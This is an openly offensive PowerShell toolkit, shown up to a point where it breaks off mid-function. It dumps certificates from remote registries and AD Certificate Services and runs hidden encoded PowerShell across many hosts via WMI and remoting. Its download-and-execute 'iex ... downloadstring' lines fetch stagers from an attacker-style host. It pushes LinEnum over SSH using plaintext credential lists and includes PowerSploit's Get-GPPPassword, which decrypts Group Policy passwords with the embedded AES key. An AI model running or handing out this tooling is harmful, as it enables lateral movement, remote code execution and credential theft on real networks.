
<#
    Author: Cube0x0
    License: BSD 3-Clause
#>
function Get-RemoteCertificates{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    .DESCRIPTION
    Download certificates from remote machine

    .EXAMPLE
    Get-RemoteCertificates -ComputerName dc.hackme.local -Output out
    'desktop-bbrc9rr','192.168.3.10','192.168.3.11' | Get-RemoteCertificates
    Get-RemoteCertificates -ComputerName desktop-bbrc9rr -Verbose
    [+] Connected to desktop-bbrc9rr
    VERBOSE: [*] Sids: .DEFAULT,S-1-5-19,S-1-5-20,S-1-5-21-888311446-1519639889-3643310532-1001,S-1-5-21-888311446-1519639889-3643310532-1001_Classes,S-1-5-18
    VERBOSE: [+] Writing certificate 90E98BB05040666936B20E23F209B10C3CBC4D96-CA.cer
    VERBOSE: [+] Writing certificate 417E225037FBFAA4F95761D5AE729E1AEA7E3A42-CA.cer
    VERBOSE: [+] Writing certificate 7EED6032C9F56387EC734CBBF32BFC14DB6DE0A2-CA.cer
    VERBOSE: [+] Writing certificate 7FCAC26BCF7B5BF7E68CD99E72F1F25AE16614F3-CA.cer
    VERBOSE: [+] Writing certificate 83DA05A9886F7658BE73ACF0A4930C0F99B92F01-CA.cer
    VERBOSE: [+] Writing certificate 8AD5C9987E6F190BD6F5416E2DE44CCD641D8CDA-CA.cer
    VERBOSE: [+] Writing certificate 8BFE3107712B3C886B1C96AAEC89984914DC9B6B-CA.cer
    VERBOSE: [+] Writing certificate 905DE119F6A0118CFFBF8B69463EFE5BD0C1D322-CA.cer
    VERBOSE: [+] Writing certificate F960E82855F1C52C8B162DD93EDA220B3DFF1389-CA.cer
    VERBOSE: [+] Writing certificate 7FCAC26BCF7B5BF7E68CD99E72F1F25AE16614F3-Root.cer
    [+] Connected to 192.168.3.10
    VERBOSE: [*] Sids: .DEFAULT,S-1-5-19,S-1-5-20,S-1-5-18
    [-] Could not open hive, permission denied
    #>
    [cmdletbinding()]
    param(
        [ValidateNotNullOrEmpty()]
        [Parameter(Position=0,Mandatory=$true,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
        $ComputerName,
        
        [ValidateNotNullOrEmpty()]
        [Parameter(Position=1)]
        [string]
        $Output = "$(Get-Location)/output"
    )
    begin{
        if(-not(Test-Path $Output)){
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output | Out-Null
        }
    }
    process{
        $up=Test-Connection $ComputerName -Count 1 -Delay 3 -ErrorAction SilentlyContinue
        if(-not($up)){
            "`n[-] Could not connect to $ComputerName"
            return
        }
        New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$ComputerName | Out-Null
        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        try{
            $sids = $reg.GetSubKeyNames()
        }catch{
            Write-Output "`n[-] Could not get sids from $ComputerName"
            return
        }
        Write-Output "`n[+] Connected to $ComputerName"
        Write-Verbose "[*] Sids: $sids"
        foreach($sid in $sids){
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$ComputerName\$sid | Out-Null
            try{
                $CA = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates\")
                $Root = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\root\Certificates\")
            }catch{
                Write-Output "[-] Could not open hive, permission denied"
                return
            }
            try{
                $CA.GetSubKeyNames() | foreach {
                    $Cert = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates\$_")
                    [byte[]]$blob=$cert.GetValue('blob')
                    Write-Verbose "[+] Writing certificate $_-CA.cer"
                    [IO.File]::WriteAllBytes("$Output\$ComputerName\$sid\$_-CA.cer", $Blob)
                }
            }catch{}
            try{
                $Root.GetSubKeyNames() | foreach {
                    $Cert = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates\$_")
                    [byte[]]$blob=$cert.GetValue('blob')
                    Write-Verbose "[+] Writing certificate $_-Root.cer"
                    [IO.File]::WriteAllBytes("$Output\$ComputerName\$sid\$_-Root.cer", $Blob)
                }
            }catch{}
        }
    }
}
function Get-DomainCertificates{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    .EXAMPLE
    Get-DomainCertificates -Verbose
    VERBOSE: [*] Domain: hackme.local
    VERBOSE: [*] Output folder: C:\Users\administrator.HACKME\Desktop\output
    [*] Dumping Enrollment Certificates
    VERBOSE: [*] Writing Enrollment-hackme-ADCS-2019-CA)
    [*] Dumping AIA certificates
    VERBOSE: [*] Writing AIA-hackme-ADCS-2019-CA)
    [*] Dumping Revoked Certificates
    VERBOSE: [*] Writing Revoke*-hackme-ADCS-2019-CA)
    PS C:\Users\administrator.HACKME\Desktop> tree.com /F
    Folder PATH listing
    Volume serial number is A4D6-C634
    C:.
    └───output
        │   AIA-hackme-ADCS-2019-CA.cer
        │   Enrollment-hackme-ADCS-2019-CA.cer
        │   RevokeBASE-hackme-ADCS-2019-CA.crl
        │   RevokeDelta-hackme-ADCS-2019-CA.crl
        │
        └───System.DirectoryServices.DirectoryEntry.cn
    #>
    [cmdletbinding()]
    param (
        [string]$Domain,
        
        [string]$DistinguishedName,
        
        [ValidateScript({test-path $_})]
        [string]$Output="$pwd\output"
    )
    begin{
        if(!$Domain){
            try{
                $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain and -domaincontroller"
                return
            }
        }
        Write-Verbose "[*] Domain: $domain"
        Write-Verbose "[*] Output folder: $output"
        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }
        if(-not(test-path $Output)){
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output | Out-Null
        }
    }
    process{
        Write-Output "[*] Dumping Enrollment Certificates"
        try{
            $CAs = ([ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName").Children
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        foreach ($CA in $CAs) {
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$ca.cn | Out-Null
            Write-Verbose "[*] Writing Enrollment-$($CA.cn))"
            [byte[]]$blob=$CA.cACertificate.value
            [IO.File]::WriteAllBytes("$Output\Enrollment-$($CA.cn).cer", $Blob)
        }

        Write-Output "[*] Dumping AIA certificates"
        try{
            $AIAs = ([ADSI]"LDAP://CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName").Children
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        foreach ($AIA in $AIAs) {
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$AIA.cn | Out-Null
            Write-Verbose "[*] Writing AIA-$($AIA.cn))"
            [byte[]]$blob=$AIA.cACertificate.value
            [IO.File]::WriteAllBytes("$Output\AIA-$($AIA.cn).cer", $Blob)
        }

        Write-Output "[*] Dumping Revoked Certificates"
        try{
            $CDPs = ([ADSI]"LDAP://CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName")
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        foreach ($CDP in $CDPs.Children) {
            foreach($Certs in $CDP.Children){
                foreach($cert in $certs){
                    New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$cert.cn | Out-Null
                    Write-Verbose "[*] Writing Revoke*-$($cert.cn))"
                    [byte[]]$blob=$cert.certificateRevocationList.value
                    [IO.File]::WriteAllBytes("$Output\RevokeBASE-$($cert.cn).crl", $Blob)
                    [byte[]]$blob=$cert.deltaRevocationList.value
                    [IO.File]::WriteAllBytes("$Output\RevokeDelta-$($cert.cn).crl", $Blob)
                }
            }
        }
    }
}
function Invoke-WindowsWMI{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Install-Module -Name PoshRSJob -Force
    Too big scripts will not work with ScriptPath

    Invoke-WindowsWMI -Url 'http://10.10.10.123/WinEnum.ps1'
    Invoke-WindowsWMI -ScriptPath 'invoke-stager.ps1'
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",

        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,
        
        [string]$Url
    )
    function local:Invoke-WMIExec{
        <#        
            .SYNOPSIS
             Execute command remotely and capture output, using only WMI.
             Copyright (c) Noxigen LLC. All rights reserved.
             Licensed under GNU GPLv3.
        
            .DESCRIPTION
            This is proof of concept code. Use at your own risk!
            
            Execute command remotely and capture output, using only WMI.
            Does not reply on PowerShell Remoting, WinRM, PsExec or anything
            else outside of WMI connectivity.
            
            .LINK
            https://github.com/OneScripter/WmiExec
            
            .EXAMPLE
            PS C:\> .\WmiExec.ps1 -ComputerName SFWEB01 -Command "gci c:\; hostname"
        
            .NOTES
            ========================================================================
                 NAME:		WmiExec.ps1
                 
                 AUTHOR:	Jay Adams, Noxigen LLC
                             
                 DATE:		6/11/2019
                 
                 Create secure GUIs for PowerShell with System Frontier.
                 https://systemfrontier.com/powershell
            ==========================================================================
        #>
        Param(
            [string]$ComputerName,
            [string]$Command
        )
        
        function CreateScriptInstance([string]$ComputerName)
        {
            # Check to see if our custom WMI class already exists
            $classCheck = Get-WmiObject -Class Noxigen_WmiExec -ComputerName $ComputerName -List -Namespace "root\cimv2"
            
            if ($classCheck -eq $null)
            {
                # Create a custom WMI class to store data about the command, including the output.
                $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
                $newClass["__CLASS"] = "Noxigen_WmiExec"
                $newClass.Qualifiers.Add("Static",$true)
                $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
                $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
                $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
                $newClass.Put() | Out-Null
            }
            
            # Create a new instance of the custom class so we can reference it locally and remotely using this key
            $wmiInstance = Set-WmiInstance -Class Noxigen_WmiExec -ComputerName $ComputerName
            $wmiInstance.GetType() | Out-Null
            $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
            $wmiInstance.Dispose()
            
            # Return the GUID for this instance
            return $CommandId
        }
        
        function GetScriptOutput([string]$ComputerName, [string]$CommandId)
        {
            $wmiInstance = Get-WmiObject -Class Noxigen_WmiExec -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
            $result = ($wmiInstance | Select-Object CommandOutput -ExpandProperty CommandOutput)
            $wmiInstance | Remove-WmiObject
            return $result
        }
        
        function ExecCommand([string]$ComputerName, [string]$Command)
        {
            #Pass the entire remote command as a base64 encoded string to powershell.exe
            $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
            
            if ($process.ReturnValue -eq 0)
            {
                $started = Get-Date
                
                Do
                {
                    if ($started.AddMinutes(2) -lt (Get-Date))
                    {
                        Write-Host "PID: $($process.ProcessId) - Response took too long."
                        break
                    }
                    
                    # TODO: Add timeout
                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                    
                    Write-Host "PID: $($process.ProcessId) - Waiting for remote command to finish..."
                    
                    Start-Sleep -Seconds 1
                }
                While ($watcher -ne $null)
                
                # Once the remote process is done, retrieve the output
                $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
                
                return $scriptOutput
            }
        }
        
        function Main()
        {
            $commandString = $Command
            
            # The GUID from our custom WMI class. Used to get only results for this command.
            $scriptCommandId = CreateScriptInstance $ComputerName
            
            if ($scriptCommandId -eq $null)
            {
                Write-Error "Error creating remote instance."
                exit
            }
            
            # Meanwhile, on the remote machine...
            # 1. Execute the command and store the output as a string
            # 2. Get a reference to our current custom WMI class instance and store the output there!
                
            $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class Noxigen_WmiExec -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
            
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
            
            $result = ExecCommand $ComputerName $encodedCommand
            
            Write-Host "[+]Results`n"
            Write-Output $result
        }
        main
    }    
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob -ErrorAction Stop
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Error checking
    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
        return
    }
    #Make sure Invoke-WMIExec is imported
    $wmi=(Get-ChildItem function: | where {$_.name -like 'Invoke-WMIExec'})
    if(-not($wmi)){
        Write-Output "Please import WmiExec.ps1 manually"
        Write-Output ". .\WmiExec.ps1"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    if($ScriptPath){
        $cmd=Get-Content $ScriptPath -ErrorAction Stop
    }else{
        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad 'Invoke-WMIExec' -ScriptBlock {
        param($Inputargs)
        $Location = $Inputargs.Location
        $Enc = $Inputargs.Enc
        $output = Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Enc"
        Add-Content -Path "$Location\$($_)" -Value $output
    } | Wait-RSJob -ShowProgress
    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Output "[-] Failed connecting to following hosts"
        Write-Output $errors
    }
}
function Invoke-WindowsPS{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Install-Module -Name PoshRSJob -Force
    Too big scripts will not work with ScriptPath

    Invoke-WindowsPS -Url 'http://10.10.10.123/WinEnum.ps1'
    Invoke-WindowsPS -ScriptPath 'invoke-stager.ps1'
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",
        
        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,

        [string]$Url,

        [Parameter(Mandatory=$true)]
        [pscredential]$Credential,

        [bool]$UseSSL = $False
    )
    #Import ComputerNames
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Error checking
    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    if($ScriptPath){
        $cmd=Get-Content $ScriptPath -ErrorAction Stop
    }else{
        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
        'Credential' = $Credential
        'UseSSL' = $UseSSL
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -ScriptBlock {
            param($Inputargs)
            $Location = $Inputargs.Location
            $Enc = $Inputargs.Enc
            $Credential = $Inputargs.Credential
            try{
                if($Inputargs.UseSSL){
                    $session = New-PSSession -ComputerName $_ -Credential $Credential -UseSSL -ErrorAction Stop
                }else{
                    $session = New-PSSession -ComputerName $_ -Credential $Credential -ErrorAction Stop
                }
            }catch{
                Add-Content -Path "$Location\$($_)" -Value '[-] Error connecting to host'
            }
            try{
                $output = Invoke-Command -Session $session -ScriptBlock {powershell -nop -exe bypass -enc $args[0]} -ArgumentList $Enc
            }catch{
                $output = "[-] $($_.Exception.Message)"
            }
            Add-Content -Path "$Location\$($_)" -Value $output
            Remove-PSSession $session
            
    } | Wait-RSJob -ShowProgress
    $errors = Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Output "[-] Failed on following hosts"
        Write-Output $errors
    }
}
function Invoke-LinuxSSH{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    import-csv linux.csv
    ComputerName Username Password
    ------------ -------- --------
    192.168.1.40 cube     cube

    Invoke-Linux -computers
    Invoke-linux -computers -script

    Install-Module -Name Posh-SSH -Force
    Install-Module -Name PoshRSJob -Force
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = '.\linux.csv',
        [ValidateScript({Test-Path -Path $_ })]
        [string]$ScriptPath
    )
    #Import ComputerName, Username, Passwords from CSV
    if(Test-Path $Computers){
        $Computers = import-csv $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob -ErrorAction Stop
        Import-Module Posh-SSH -ErrorAction Stop
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\linux"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'linux' -Path "." | Out-Null
    }
    #Get latest LinEnum.sh
    #Use a local copy for extended testing
    if($ScriptPath){
        $Script = Get-Content $ScriptPath -ErrorAction Stop
    }else{
        try{
            $Script = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh')
        }catch{
            Write-Output "[-] Can't Download LinEnum"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
    }
    #Params
    $ScriptParams = @{
        'Script' = $Script
        'Location' = $OutputFolder
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob 
    $Computers | start-rsjob -Name {$_.computername} -ArgumentList $ScriptParams -ModulesToImport 'Posh-SSH' -ScriptBlock {
            param($Inputargs)
            $Script = $Inputargs.Script
            $Location = $Inputargs.Location
            $secpasswd = ConvertTo-SecureString $_.password -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential ($_.username, $secpasswd)
            try{
                $session = New-SSHSession -ComputerName $_.ComputerName -Credential $creds -Force -WarningAction SilentlyContinue
            }catch{
                Add-Content -Path "$Location\$($_.ComputerName)" -Value '[-] Error connecting to host'
            }
            if($session){
                $output = (Invoke-SSHCommand -SSHSession $session -Command "$script | /bin/bash")
                Add-Content -Path "$Location\$($_.ComputerName)" -Value $output.output
                Remove-SSHSession -SSHSession $session | Out-Null
            }
        } | Wait-RSJob -ShowProgress
        $errors=Get-RSJob | where {$_.HasErrors -eq $true}
        if($errors){
            Write-Output "[-] Failed connecting to following hosts"
            Write-Output $errors
        }
}
function Get-GroupPolicyPassword {
    <#
    .SYNOPSIS
    
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
    
    PowerSploit Function: Get-GPPPassword  
    Author: Chris Campbell (@obscuresec)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    Optional Dependencies: None  
    
    .DESCRIPTION
    
    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
    
    .PARAMETER Server
    
    Specify the domain controller to search for.
    Default's to the users current domain
    
    .PARAMETER SearchForest
    
    Map all reaschable trusts and search all reachable SYSVOLs.
    
    .EXAMPLE
    
    Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
    
    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    Passwords : {password, password1234$}
    UserNames : {administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {DEMO\Administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
    
    .EXAMPLE
    
    Get-GPPPassword -Server EXAMPLE.COM
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml
    
    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml
    
    .EXAMPLE
    
    Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!
    
    .LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
    #>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SearchForest
    )

    # define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword
        )

        try {
            #Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            # Make sure System.Core is loaded
            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null

            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch { Write-Error $Error[0] }
    }

    # helper function to parse fields from xml files
    function Get-GPPInnerField {
    [CmdletBinding()]
        Param (
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            # check for the cpassword field
            if ($Xml.innerxml -match 'cpassword') {

                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                           $Password = $DecryptedPassword
                           Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
                        }

                        if ($_.newName) {
                            $NewName = $_.newName
                        }

                        if ($_.userName) {
                            $UserName = $_.userName
                        }
                        elseif ($_.accountName) {
                            $UserName = $_.accountName
                        }
                        elseif ($_.runAs) {
                            $UserName = $_.runAs
                        }

                        try {
                            $Changed = $_.ParentNode.changed
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
                        }

                        try {
                            $NodeName = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                        }

                        if (!($Password)) {$Password = '[BLANK]'}
                        if (!($UserName)) {$UserName = '[BLANK]'}
                        if (!($Changed)) {$Changed = '[BLANK]'}
                        if (!($NewName)) {$NewName = '[BLANK]'}

                        $GPPPassword = New-Object PSObject
                        $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
                        $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
                        $GPPPassword | Add-Member Noteproperty 'Password' $Password
                        $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
                        $GPPPassword | Add-Member Noteproperty 'File' $File
                        $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
                        $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
                        $GPPPassword
                    }
                }
            }
        }
        catch {
            Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
        }
    }

    # helper function (adapted from PowerView) to enumerate the domain/forest trusts for a specified domain
    function Get-DomainTrust {
        [CmdletBinding()]
        Param (
            $Domain
        )

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                if ($DomainObject) {
                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
            }

            try {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                if ($ForestObject) {
                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
            }
        }
    }

    # helper function (adapted from PowerView) to enumerate all reachable trusts from the current domain
    function Get-DomainTrustMapping {
        [CmdletBinding()]
        Param ()

        # keep track of domains seen so we don't hit infinite recursion
        $SeenDomains = @{}

        # our domain stack tracker
        $Domains = New-Object System.Collections.Stack

        try {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            $CurrentDomain
        }
        catch {
            Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
        }

        if ($CurrentDomain -and $CurrentDomain -ne '') {
            $Domains.Push($CurrentDomain)

            while($Domains.Count -ne 0) {

                $Domain = $Domains.Pop()

                # if we haven't seen this domain before
                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

                    Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

                    # mark it as seen in our list
                    $Null = $SeenDomains.Add($Domain, '')

                    try {
                        # get all the domain/forest trusts for this domain
                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                            # only output if we haven't already seen this domain and if it's pingable
                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = $Domains.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-DomainTrustMapping] Error: $_"
                    }
                }
            }
        }
    }

    try {
        $XMLFiles = @()
        $Domains = @()

        $AllUsers = $Env:ALLUSERSPROFILE
        if (-not $AllUsers) {
            $AllUsers = 'C:\ProgramData'
        }

        # discover any locally cached GPP .xml files
        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ($SearchForest) {
            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
            $Domains += Get-DomainTrustMapping
        }
        else {
